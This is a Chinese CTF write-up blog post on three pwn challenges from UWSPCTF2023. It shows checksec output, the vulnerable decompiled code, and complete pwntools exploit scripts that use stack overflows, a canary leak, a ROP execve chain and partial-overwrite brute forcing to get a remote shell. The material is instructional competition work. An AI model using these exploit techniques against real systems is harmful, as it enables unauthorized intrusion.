  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/11/UWSPCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/11/UWSPCTF2023/" class="post-title-link" itemprop="url">UWSPCTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-10-11 23:43:55 / Modified: 23:44:42" itemprop="dateCreated datePublished" datetime="2023-10-11T23:43:55+08:00">2023-10-11</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="exploit1"><a href="#exploit1" class="headerlink" title="exploit1"></a>exploit1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exploit1.bin: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">5</span>a320c8445c424a78f554fa7c6ab33175e11e30e, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>栈溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter new username: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%s&quot;</span>, name);</span><br></pre></td></tr></table></figure>
<p>有后门：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( key == <span class="number">1337</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Starting debug shell&quot;</span>);</span><br><span class="line">  execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>利用栈溢出简单覆盖 key 值为 1337 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./exploit1.bin&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;34.123.210.162&#x27;</span>,<span class="string">&#x27;20232&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x14A7)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+p32(<span class="number">0</span>)+p32(<span class="number">1337</span>)</span><br><span class="line">sla(<span class="string">&quot;Choice: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;Enter new username: &quot;</span>,payload)</span><br><span class="line">sla(<span class="string">&quot;Choice: &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="exploit2"><a href="#exploit2" class="headerlink" title="exploit2"></a>exploit2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exploit2.bin: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (GNU/Linux), statically linked, BuildID[sha1]=<span class="number">2225439f</span>e6f084b9baea4c6a07e31d32109da59d, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">➜  pwn checksec exploit2.bin </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/pwn/exploit2.bin&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，statically，Partial RELRO，Canary，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>栈溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\nWaiting for heart beat request...&quot;</span>);</span><br><span class="line">_isoc99_scanf((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot; %d:%s&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;num, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)buf, v3, v4, v5, v7);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>先利用 write 泄露 canary，然后构造 sys_read 写入 <code>/bin/sh</code>，接着构造 sys_execve</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./exploit2.bin&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;34.123.210.162&#x27;</span>,<span class="string">&#x27;20233&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x401EF9\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x14A7)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload = <span class="string">&quot;1400:&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">1024</span>+<span class="string">&quot;b&quot;</span>*<span class="number">8</span></span><br><span class="line">sla(<span class="string">&quot;request...&quot;</span>,payload)</span><br><span class="line">ru(<span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">success(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x4E1240</span>+<span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x0000000000451fd7</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004018e2</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000040f30e</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004017ef</span></span><br><span class="line">syscall_ret = <span class="number">0x000000000041f5c4</span></span><br><span class="line"></span><br><span class="line">rop_read =  <span class="string">&quot;&quot;</span></span><br><span class="line">rop_read += p64(pop_rax_ret)+p64(<span class="number">0</span>)</span><br><span class="line">rop_read += p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">rop_read += p64(pop_rsi_ret)+p64(bss_addr)</span><br><span class="line">rop_read += p64(pop_rdx_ret)+p64(<span class="number">0x60</span>)</span><br><span class="line">rop_read += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">rop_execve = <span class="string">&quot;&quot;</span></span><br><span class="line">rop_execve += p64(pop_rax_ret)+p64(<span class="number">59</span>)</span><br><span class="line">rop_execve += p64(pop_rdi_ret)+p64(bss_addr)</span><br><span class="line">rop_execve += p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">rop_execve += p64(pop_rdx_ret)+p64(<span class="number">0</span>)</span><br><span class="line">rop_execve += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;0:&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">1032</span>+p64(canary)+<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>+rop_read+rop_execve</span><br><span class="line">sla(<span class="string">&quot;request...&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="exploit3"><a href="#exploit3" class="headerlink" title="exploit3"></a>exploit3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exploit3.bin: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=ee04914473e2edcc2f0cd1fcf5b8fab1590acaf2, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，PIE</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>栈溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello! What&#x27;s your name?: &quot;</span>);</span><br><span class="line">get_string(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Nice to meet you %s!\n&quot;</span>, buf);</span><br></pre></td></tr></table></figure>
<p>有后门：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  alarm(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>先泄露程序基地址，然后覆盖返回地址末尾2字节为 main（1/16 的爆破概率）</p>
<p>再次执行时覆盖返回地址为后门函数即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./exploit3.bin&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">if local:</span></span><br><span class="line"><span class="string">    p = process(challenge)</span></span><br><span class="line"><span class="string">    #p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    p = remote(&#x27;34.123.210.162&#x27;,&#x27;20234&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *0x401EF9\n&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x13A0)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+p16(<span class="number">0x43ad</span>)<span class="comment">#p16(0x53ad)</span></span><br><span class="line">    sla(<span class="string">&quot;name?:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">    leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    pro_base = leak_addr - <span class="number">0x13ad</span></span><br><span class="line">    success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">    ret = pro_base + <span class="number">0x000000000000101a</span></span><br><span class="line">    main_addr = pro_base + <span class="number">0x13ad</span></span><br><span class="line">    magic_addr = pro_base + <span class="number">0x1369</span></span><br><span class="line">    back_addr = pro_base + <span class="number">0x13CB</span></span><br><span class="line"></span><br><span class="line">    shellcode = <span class="string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+p64(back_addr)</span><br><span class="line">    sla(<span class="string">&quot;name?:&quot;</span>,payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> local:</span><br><span class="line">            p = process(challenge)</span><br><span class="line">            <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = remote(<span class="string">&#x27;34.123.210.162&#x27;</span>,<span class="string">&#x27;20234&#x27;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        sleep(<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/11/%E7%AE%80%E5%8D%95JavaScript%E8%A7%A3%E9%87%8A%E5%99%A8/">

